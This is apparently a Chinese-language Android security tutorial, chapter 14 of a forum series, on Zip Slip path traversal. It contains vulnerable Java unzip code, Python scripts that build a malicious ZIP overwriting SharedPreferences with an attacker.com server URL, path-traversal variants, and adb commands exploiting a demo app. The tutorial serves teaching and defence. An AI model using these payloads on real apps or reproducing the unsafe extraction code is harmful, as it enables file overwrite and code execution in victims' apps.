# Android移动安全第十四章_ZipSlip路径遍历
> QIANXIN Team
> 来源：https://forum.butian.net/share/4882

\> 系列目录：  
\> 1. Android 组件导出安全  
\> 2. Android Intent 安全  
\> 3. Android Binder 服务安全  
\> 4. Android ContentProvider 安全  
\> 5. Android WebView 安全  
\> 6. Android UI 欺骗与钓鱼  
\> 7. Android Deep Link 安全  
\> 8. Android 广播安全  
\> 9. Android PendingIntent 安全  
\> 10. Android 系统设置安全  
\> 11. Android SSRF 与网络安全  
\> 12. Android 加密与数据存储安全  
\> 13. Android 认证与证书校验  
\> 14. Android Zip Slip 路径遍历（本章）  
\> 15. Android Fragment Injection  
\> 16. Android SELinux 与沙箱机制

* * *

## 1\. 前言

ZIP 文件格式中，每个条目（entry）都有一个文件名字段。这个文件名可以包含目录分隔符 `/`，用于表示目录结构。比如 `assets/images/logo.png` 表示文件在 `assets/images/` 子目录下。

问题在于，ZIP 规范没有禁止文件名中包含 `../`（上级目录引用）。如果一个 ZIP 条目的文件名是 `../../shared_prefs/config.xml`，解压时如果直接用这个文件名拼接目标目录，文件就会被写到目标目录的上级目录中——跳出了预期的解压范围。

这个漏洞在 2018 年被 Snyk 安全团队命名为 Zip Slip，影响了多种语言和平台的 ZIP 处理库。在 Android 上，由于 App 的私有目录结构是固定的（`/data/data//` 下有 `shared_prefs/`、`databases/`、`files/` 等子目录），攻击者可以精确计算 `../` 的层数来覆写特定文件。

* * *

## 2\. 漏洞原理

### 2.1 不安全的解压代码

Java 标准库的 `java.util.zip.ZipInputStream` 不会自动校验文件名中的路径遍历。典型的不安全解压代码：

```java
public void unzip(InputStream zipStream, File destDir) throws IOException {
    ZipInputStream zis = new ZipInputStream(zipStream);
    ZipEntry entry;
    while ((entry = zis.getNextEntry()) != null) {
        
        File outFile = new File(destDir, entry.getName());

        if (entry.isDirectory()) {
            outFile.mkdirs();
        } else {
            outFile.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(outFile);
            byte[] buffer = new byte[4096];
            int len;
            while ((len = zis.read(buffer)) &gt; 0) {
                fos.write(buffer, 0, len);
            }
            fos.close();
        }
        zis.closeEntry();
    }
    zis.close();
}
```

如果 `entry.getName()` 返回 `../../shared_prefs/evil.xml`，`new File(destDir, entry.getName())` 会解析为 `destDir` 的上两级目录下的 `shared_prefs/evil.xml`。

### 2.2 路径解析

Java 的 `File` 构造函数在拼接路径时会保留 `../`：

```java
File destDir = new File("/data/data/com.target.app/files/unzip_temp");
File outFile = new File(destDir, "../../shared_prefs/evil.xml");

outFile.getPath();


outFile.getCanonicalPath();

```

`getPath()` 保留了原始路径中的 `../`，而 `getCanonicalPath()` 会解析掉 `../` 返回规范化的绝对路径。安全校验应该使用 `getCanonicalPath()` 来判断最终路径是否在预期目录内。

### 2.3 攻击效果

根据解压目标目录和 `../` 的层数，攻击者可以覆写 App 私有目录下的不同文件：

| 目标文件 | 效果 |
| --- | --- |
| shared_prefs/*.xml | 覆写 SharedPreferences，注入配置（如修改服务器地址、注入 token） |
| databases/*.db | 覆写 SQLite 数据库，注入数据 |
| files/*.dex | 覆写动态加载的 DEX 文件，实现代码执行 |
| lib/*.so | 覆写 native 库，实现代码执行（需要 App 重启后加载） |
| code_cache/*.dex | 覆写编译缓存，影响 App 行为 |

覆写 DEX 文件或 SO 库是最严重的利用方式——等于在 App 的上下文中执行任意代码，拥有 App 的所有权限。

* * *

## 3\. 触发场景

### 3.1 从网络下载 ZIP

App 从服务器下载 ZIP 文件并解压是最常见的场景。如果下载过程没有使用 HTTPS 或没有校验文件完整性（如签名验证），中间人攻击者可以替换 ZIP 文件：

```java

URL url = new URL("https://cdn.example.com/resources.zip");
InputStream is = url.openStream();
unzip(is, new File(getFilesDir(), "resources"));
```

即使使用了 HTTPS，如果 App 禁用了证书校验（第十三章讲过），中间人仍然可以替换 ZIP 文件。

### 3.2 通过 Intent 接收 ZIP

如果 App 的导出组件接受外部传入的文件路径或 URI 并解压：

```java

Uri zipUri = getIntent().getData();
InputStream is = getContentResolver().openInputStream(zipUri);
unzip(is, new File(getFilesDir(), "imported"));
```

攻击者可以构造一个包含路径遍历条目的 ZIP 文件，通过 Intent 传给目标 App。

### 3.3 通过 ContentProvider 接收

第四章讲过 ContentProvider 的 `openFile()` 方法。如果 App 通过 ContentProvider 接收文件并解压，攻击者可以通过自己的 ContentProvider 提供恶意 ZIP 文件。

### 3.4 热更新 / 插件加载

一些 App 使用热更新机制——从服务器下载补丁包（通常是 ZIP 格式），解压后加载其中的 DEX 文件或资源。如果解压过程存在 Zip Slip 漏洞，攻击者可以通过替换补丁包来实现代码执行。

* * *

## 4\. 构造恶意 ZIP

### 4.1 使用 Python 构造

Python 的 `zipfile` 模块允许创建包含任意文件名的 ZIP 条目：

```python
import zipfile
import os

with zipfile.ZipFile('evil.zip', 'w') as zf:
    
    zf.writestr('readme.txt', 'This is a normal file.')

    
    zf.writestr('../../shared_prefs/evil_config.xml',
        '&lt;?xml version="1.0" encoding="utf-8" standalone="yes" ?&gt;\n'
        '\n'
        '    https://attacker.com/api\n'
        '    true\n'
        '\n')
```

### 4.2 使用命令行工具

也可以用 `zip` 命令的符号链接技巧，或者直接用十六进制编辑器修改 ZIP 文件中的文件名字段。但 Python 方式最方便。

* * *

## 5\. ZipEntry.getName() 的变体

### 5.1 不同的路径遍历写法

除了标准的 `../`，还有一些变体可能绕过简单的字符串检查：

| 写法 | 说明 |
| --- | --- |
| ../ | 标准的上级目录引用 |
| ..\ | Windows 风格的路径分隔符（Java 的 File 类在 Linux 上不识别，但某些解析库可能处理） |
| ..%2F | URL 编码的 /（ZIP 文件名通常不做 URL 解码，但如果 App 对文件名做了额外处理可能生效） |
| /absolute/path | 绝对路径（如果 App 直接用 new File(entry.getName()) 而不是拼接目标目录） |

### 5.2 符号链接

ZIP 格式支持符号链接（symlink）条目。如果解压代码创建了符号链接，攻击者可以：

1.  第一个条目：创建一个符号链接 `link` → `/data/data/com.target.app/shared_prefs/`
2.  第二个条目：`link/evil.xml`，内容是恶意配置

解压时，`link` 被创建为指向 `shared_prefs/` 的符号链接，然后 `link/evil.xml` 实际写入了 `shared_prefs/evil.xml`。

不过 Java 的 `ZipInputStream` 默认不处理符号链接条目，这种攻击更多出现在使用 native 解压库（如 `libarchive`）的场景中。

* * *

## 6\. 版本演进

### 6.1 Java 标准库

Java 的 `java.util.zip` 包从未在 API 层面添加路径遍历校验。`ZipEntry.getName()` 原样返回 ZIP 文件中存储的文件名，不做任何过滤。这个行为在所有 Android 版本上都一样。

### 6.2 Android 14（API 34）

Android 14 在 `ZipInputStream` 中添加了路径遍历检测。如果 `ZipEntry` 的文件名包含 `..`，`getNextEntry()` 会抛出 `ZipException`：

```php
java.util.zip.ZipException: Invalid zip entry name: ../../evil.txt
```

这个检测默认对 targetSdk >= 34 的 App 启用。targetSdk < 34 的 App 不受影响，行为和之前一样。

App 可以通过兼容性标志禁用这个检测（不推荐）：

### 6.3 第三方库

一些第三方 ZIP 处理库（如 Apache Commons Compress）在较新版本中添加了路径遍历检测。但旧版本仍然存在问题，且很多 App 使用的是 Java 标准库而非第三方库。

* * *

## 7\. 演示

下面用配套的演示 App（com.demo.zipslip）来展示 Zip Slip 漏洞的效果。

Demo App 模拟了一个常见场景：App 从外部接收 ZIP 文件并解压到私有目录。解压代码没有校验文件名中的路径遍历，攻击者构造的恶意 ZIP 可以覆写 App 的 SharedPreferences。

### 7.1 不安全的解压

VulnUnzipActivity 接收 ZIP 文件路径并解压：

```java

File outFile = new File(destDir, entry.getName());
```

先用 Python 构造恶意 ZIP，然后推送到 App 私有目录并触发解压：

```bash

python3 -c "
import zipfile, io, sys
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr('readme.txt', 'normal file')
    zf.writestr('../../shared_prefs/evil_config.xml',
        '&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?&gt;\n'
        '\n'
        '    https://attacker.com/api\n'
        '    true\n'
        '')
sys.stdout.buffer.write(buf.getvalue())
" &gt; /tmp/evil.zip


adb push /tmp/evil.zip /data/local/tmp/evil.zip
adb shell run-as com.demo.zipslip \
    cp /data/local/tmp/evil.zip /data/data/com.demo.zipslip/files/evil.zip


adb shell am start -n com.demo.zipslip/.VulnUnzipActivity \
    --es zip_path "/data/data/com.demo.zipslip/files/evil.zip"
```

VulnUnzipActivity 界面显示了每个条目的路径和规范路径，可以看到 `../../shared_prefs/evil_config.xml` 的规范路径跳出了解压目录：

![demo14_unzip.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/04/attach-f4b7749f173696561cd25e9d4cc0f4125d97df09.png)

### 7.2 验证覆写

logcat 输出确认了路径遍历：

```php
W VulnUnzip: 开始解压: /data/data/com.demo.zipslip/files/evil.zip
W VulnUnzip: 解压条目: readme.txt → /data/data/com.demo.zipslip/files/unzip_temp/readme.txt
W VulnUnzip: 路径遍历检测: ../../shared_prefs/evil_config.xml → /data/data/com.demo.zipslip/shared_prefs/evil_config.xml
W VulnUnzip: 解压条目: ../../shared_prefs/evil_config.xml → /data/data/com.demo.zipslip/shared_prefs/evil_config.xml
W VulnUnzip: 解压完成，共 2 个文件
```

回到主页检查 SharedPreferences：

```php
W ZipSlipDemo: SharedPreferences 被覆写！
W ZipSlipDemo: server_url = https:
W ZipSlipDemo: injected = true
```

恶意 ZIP 中的 `../../shared_prefs/evil_config.xml` 跳出了解压目录，成功写入了 App 的 SharedPreferences 目录。App 读取这个 SharedPreferences 时会得到攻击者注入的配置。

![demo14_zipslip.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/04/attach-4026372534046b67a02ce0d934f757f36b2b9d90.png)

* * *

## 8\. 总结

Zip Slip 的本质是路径拼接时没有校验最终路径是否在预期范围内。ZIP 文件名中的 `../` 让文件跳出了解压目录，写入了 App 私有目录下的其他位置。

回顾一下：

-   Java 的 ZipEntry.getName() 原样返回文件名，不做路径遍历过滤
-   覆写 SharedPreferences 可以注入配置，覆写 DEX/SO 可以实现代码执行
-   网络下载、Intent 接收、ContentProvider 是 ZIP 文件的常见来源
-   Android 14 在 ZipInputStream 中添加了路径遍历检测（targetSdk >= 34）
-   getCanonicalPath() 可以解析掉 `../`，用于校验最终路径是否在目标目录内

下一章讲 Android Fragment Injection。Fragment 是 Activity 内部的 UI 模块，如果 Activity 根据外部输入动态加载 Fragment，攻击者可以注入任意 Fragment 类名来加载 App 内部的敏感 Fragment。
